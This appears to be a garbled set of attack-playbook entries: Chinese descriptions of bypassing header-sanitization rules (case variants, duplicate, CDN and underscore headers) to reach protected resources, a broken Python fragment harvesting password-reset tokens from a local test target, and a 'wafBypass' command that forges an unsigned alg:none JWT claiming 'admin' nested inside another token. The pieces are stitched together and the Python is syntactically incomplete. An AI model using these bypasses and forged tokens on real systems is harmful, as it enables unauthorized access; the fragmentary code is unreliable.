description.zh: 绕过头名精确匹配的清洗规则：大小写变体与重复头叠加，不同中间件取值不同。成功判据：受保护资源返回 200。

description.zh: 轮换 CDN/代理专有头命中未被清洗的取值字段。成功判据：任一头使访问控制放行。

description.zh: 下划线变体经 nginx 等 underscore 处理差异进入取值。成功判据：变体头被采信。

import requests
import time
TARGET = "http://127.0.0.1:8080/test/password-reset"

    token = response.json()["test_token"]
    tokens.append(token)

    time.sleep(1)

# Analyze length and uniqueness only; do not claim predictability without a validated generator model.

wafBypass.command:
python3 - <<'PY'
import base64, json
inner = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=') + "." + base64.urlsafe_b64encode(b'{"sub":"admin"}').decode().rstrip('=') + "."
outer_payload = {"token": inner}
p = base64.urlsafe_b64encode(json.dumps(outer_payload, separators=(',',':')).encode()).decode().rstrip('=')
h = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
print(f"{h}.{p}.")
PY

description.en: Outer carrier wraps an inner JWT to probe double-decode trust. Success: inner claims are honored.
